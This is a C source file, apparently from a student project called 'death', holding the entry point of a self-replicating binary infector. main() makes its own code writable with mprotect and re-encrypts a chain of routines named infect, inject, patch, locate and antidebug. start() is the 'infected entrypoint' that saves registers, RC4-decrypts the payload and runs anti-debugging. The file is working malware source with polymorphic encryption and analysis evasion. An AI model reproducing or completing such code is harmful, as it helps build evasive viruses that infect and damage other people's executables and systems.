/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*  start.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/22 21:01:35 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "death.h"

/*
   main() transform our main host (number 0 infection) into an *almost* infected binary
   to match our flip-flop infection routine.
*/
int		main(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);


	void	*sstart = main;
	size_t	align = (unsigned long)sstart % 0x1000;

	// set write permission
	if (mprotect(sstart - align, ((void*)end_of_data - (void*)main) + 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		return (-1);
	}

	// erase
	update_two(&data.key, (char*)release, (size_t)erase - (size_t)release);
	revert_two(&data.key, (char*)erase, (size_t)end - (size_t)erase);

	// release
	update_one(&data.key, (char*)patch, (size_t)release - (size_t)patch);
	revert_one(&data.key, (char*)release, (size_t)erase - (size_t)release);

	// patch
	update_two(&data.key, (char*)inject, (size_t)patch - (size_t)inject);
	revert_two(&data.key, (char*)patch, (size_t)release - (size_t)patch);

	// inject
	update_one(&data.key, (char*)infect, (size_t)inject - (size_t)infect);
	revert_one(&data.key, (char*)inject, (size_t)patch - (size_t)inject);

	// infect
	update_two(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_two(&data.key, (char*)infect, (size_t)inject - (size_t)infect);

	// inspect
	update_one(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
	revert_one(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);

	// locate
	update_two(&data.key, (char*)death, (size_t)locate - (size_t)death);
	revert_two(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);

	// death
	update_one(&data.key, (char*)opening, (size_t)death - (size_t)opening);
	revert_one(&data.key, (char*)death, (size_t)locate - (size_t)death);

	// opening
	update_two(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug);
	revert_two(&data.key, (char*)opening, (size_t)death - (size_t)opening);

	// antidebug
	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start);
	revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug);

	// antidebug
	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start);
	revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug);

	data.context = true;
	antidebug(&data);
}

/*
   Infected entrypoint. Backup all register to restart stack as if nothing happened (using rsp),
   then decrypt whole infection from opening() to end().
*/
void	start(void)
{

	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);

	// rc4 decryption
	uint8_t *r4 = (uint8_t*)_rc4;
   	for (register int i = 0  ; i < KEY_SIZE ; i++)
		data.cpr_key[i] = r4[i];
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)antidebug, ((size_t)_rc4 - (size_t)antidebug));

#ifdef DEBUG
	char log[] = "\nstart\t\t";
	_log(log, NULL, 8, 0);
#endif

	data.context = true;

	update_one(&data.key, (char*)start, (size_t)antidebug - (size_t)start);
	revert_one(&data.key, (char*)antidebug, (size_t)opening - (size_t)antidebug);
	antidebug(&data);
}
